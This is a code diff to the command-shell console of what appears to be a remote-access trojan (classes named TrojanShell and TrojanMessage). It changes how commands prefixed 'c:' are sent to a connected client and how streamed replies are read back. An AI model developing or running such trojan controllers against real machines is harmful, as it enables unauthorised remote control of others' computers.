@@ -3,9 +3,11 @@ from trojanshell import TrojanShell
 from JTShell.processes import Process
 from JTShell.util.message import Message
 from JTShell.util.ansi import Colors
+from serverconnection import FlowControlClient
 from util import trojanrecv
 from util import TrojanMessage
 import sys
+import time
 
 
 class CommandShell(TrojanShell):
@@ -34,10 +36,16 @@ class CommandShell(TrojanShell):
                     else:
                         break
                 # skipping the whole procedure in case the command prompt is empty
-                if command != "" and command != " ":
+                if command != "" and command != " " :
                     # calling the execute function of the client, and printing it
-                    reply = TrojanMessage(self.client.execute_wait("c:" + command).replace("\\r\\n", "\n"))
-                    print(reply.message)
+                    self.client.execute("c:" + command)
+                    while self.client.end_seq not in self.client.receive_buffer:
+                        while len(self.client.receive_buffer) == 0:
+                            time.sleep(0.01)
+                        reply = self.client.receive()
+                        message = TrojanMessage(reply)
+                        print(str(message))
+
 
         except SystemExit:
             pass
